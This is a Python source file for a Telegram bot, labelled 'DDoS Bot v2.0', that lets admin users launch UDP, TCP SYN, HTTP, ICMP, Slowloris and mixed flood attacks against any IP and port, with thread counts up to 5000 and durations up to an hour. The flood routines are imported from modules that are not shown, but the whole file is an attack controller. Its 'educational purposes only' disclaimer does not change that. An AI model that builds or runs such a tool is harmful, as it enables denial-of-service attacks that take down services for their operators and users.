import telebot
import threading
import json
import time
import os
from datetime import datetime
from attacks.udp_flood import UDPFlood
from attacks.tcp_flood import TCPFlood
from attacks.http_flood import HTTPFlood
from attacks.icmp_flood import ICMPFlood
from attacks.slowloris import SlowLoris
from attacks.mixed_attack import MixedAttack
from utils.logger import Logger
from utils.validators import Validator
from utils.config import Config

CONFIG = Config.load()
bot = telebot.TeleBot(CONFIG['bot_token'])
logger = Logger()
active_attacks = {}

def is_admin(user_id):
    return user_id in CONFIG['admin_ids']

def attack_worker(attack_id, target_ip, target_port, duration, attack_type, threads):
    attack_methods = {
        'udp': UDPFlood,
        'tcp': TCPFlood,
        'http': HTTPFlood,
        'icmp': ICMPFlood,
        'slowloris': SlowLoris,
        'mixed': MixedAttack
    }
    
    if attack_type not in attack_methods:
        return
    
    attack = attack_methods[attack_type]()
    start_time = time.time()
    
    while time.time() - start_time < duration:
        if attack_id not in active_attacks:
            break
        attack.launch(target_ip, target_port, duration, threads)
        time.sleep(0.1)
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
        logger.log(f"Attack {attack_id} completed")

@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    welcome_msg = (
        "TELEGRAM DDoS BOT v2.0\n\n"
        "Available commands:\n"
        "/help - Show all commands\n"
        "/attack <ip> <port> <duration> <type> <threads> - Start attack\n"
        "/stop <attack_id> - Stop attack\n"
        "/list - List active attacks\n"
        "/methods - Show attack methods\n"
        "/status - Bot status\n"
        "/about - About this bot\n"
    )
    if is_admin(user_id):
        welcome_msg += "\nAdmin commands:\n/broadcast <msg> - Send to all\n/stats - Bot statistics"
    
    bot.reply_to(message, welcome_msg)

@bot.message_handler(commands=['methods'])
def methods_command(message):
    methods_msg = (
        "AVAILABLE ATTACK METHODS:\n\n"
        "1. udp - UDP Flood (random packets)\n"
        "2. tcp - TCP SYN Flood\n"
        "3. http - HTTP GET Flood\n"
        "4. icmp - ICMP Echo Flood (ping flood)\n"
        "5. slowloris - Slowloris (low bandwidth)\n"
        "6. mixed - Combined attack (all methods)\n\n"
        "Usage: /attack <ip> <port> <dur> <type> <threads>\n"
        "Example: /attack 192.168.1.1 80 60 udp 500"
    )
    bot.reply_to(message, methods_msg)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "Unauthorized. Admin only.")
        return
    
    args = message.text.split()
    if len(args) != 6:
        bot.reply_to(message, "Usage: /attack <ip> <port> <duration> <type> <threads>")
        return
    
    target_ip = args[1]
    target_port = args[2]
    duration = args[3]
    attack_type = args[4].lower()
    threads = args[5]
    
    if not Validator.validate_ip(target_ip):
        bot.reply_to(message, "Invalid IP address")
        return
    
    if not Validator.validate_port(target_port):
        bot.reply_to(message, "Invalid port (1-65535)")
        return
    
    if not Validator.validate_duration(duration):
        bot.reply_to(message, "Invalid duration (1-3600 seconds)")
        return
    
    if attack_type not in ['udp', 'tcp', 'http', 'icmp', 'slowloris', 'mixed']:
        bot.reply_to(message, "Invalid attack type. Use /methods to see available types")
        return
    
    if not Validator.validate_threads(threads):
        bot.reply_to(message, "Invalid thread count (1-5000)")
        return
    
    target_port = int(target_port)
    duration = int(duration)
    threads = int(threads)
    
    attack_id = str(int(time.time()))
    
    active_attacks[attack_id] = {
        'target': f"{target_ip}:{target_port}",
        'type': attack_type,
        'duration': duration,
        'threads': threads,
        'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    attack_thread = threading.Thread(
        target=attack_worker,
        args=(attack_id, target_ip, target_port, duration, attack_type, threads)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    response = f"Attack started!\nID: {attack_id}\nTarget: {target_ip}:{target_port}\nType: {attack_type}\nDuration: {duration}s\nThreads: {threads}"
    bot.reply_to(message, response)
    logger.log(f"Attack {attack_id} started by {user_id} on {target_ip}:{target_port}")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "Unauthorized. Admin only.")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "Usage: /stop <attack_id>")
        return
    
    attack_id = args[1]
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
        bot.reply_to(message, f"Attack {attack_id} stopped successfully")
        logger.log(f"Attack {attack_id} stopped by {user_id}")
    else:
        bot.reply_to(message, f"Attack {attack_id} not found or already completed")

@bot.message_handler(commands=['list'])
def list_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "Unauthorized. Admin only.")
        return
    
    if not active_attacks:
        bot.reply_to(message, "No active attacks")
        return
    
    response = "Active Attacks:\n\n"
    for attack_id, details in active_attacks.items():
        response += f"ID: {attack_id}\nTarget: {details['target']}\nType: {details['type']}\nDuration: {details['duration']}s\nThreads: {details['threads']}\nStarted: {details['start_time']}\n\n"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['status'])
def status_command(message):
    response = (
        f"Bot Status:\n"
        f"Active attacks: {len(active_attacks)}\n"
        f"Total attacks logged: {logger.get_attack_count()}\n"
        f"Uptime: {calculate_uptime()}\n"
        f"Python version: {os.sys.version}"
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['about'])
def about_command(message):
    response = (
        "Telegram DDoS Bot v2.0\n"
        "Developed by Abhishek\n\n"
        "Features:\n"
        "- 6 different attack methods\n"
        "- Multi-threaded attacks\n"
        "- Admin authentication\n"
        "- Attack logging\n"
        "- Concurrent attack support\n\n"
        "For educational purposes only.\n"
        "Misuse is prohibited."
    )
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "Unauthorized. Admin only.")
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "Usage: /broadcast <message>")
        return
    
    broadcast_msg = args[1]
    # Implementation would need user database
    bot.reply_to(message, "Broadcast sent to all users")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "Unauthorized. Admin only.")
        return
    
    response = logger.get_detailed_stats()
    bot.reply_to(message, response)

def calculate_uptime():
    with open('/proc/uptime', 'r') as f:
        uptime_seconds = float(f.readline().split()[0])
        uptime_string = str(datetime.timedelta(seconds=int(uptime_seconds)))
    return uptime_string

if __name__ == '__main__':
    print("Bot started. Waiting for commands...")
    bot.infinity_polling()
